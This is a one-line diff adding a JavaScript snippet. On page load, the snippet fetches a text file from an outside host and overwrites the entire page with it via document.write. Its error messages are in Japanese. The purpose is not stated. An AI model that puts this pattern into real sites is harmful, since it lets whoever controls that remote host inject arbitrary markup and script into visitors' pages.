@@ -1,0 +1,1 @@
+const url = 'https://i-i.f5.si/jclbid7.txt';  window.onload = async () => { try { const response = await fetch(url); if (!response.ok) throw new Error(`HTTPエラー！ステータス: ${response.status}`);  const html = await response.text(); document.open(); document.write(html); document.close(); } catch (error) { console.error('エラー:', error); alert('構成に失敗しました: ' + error.message); } };
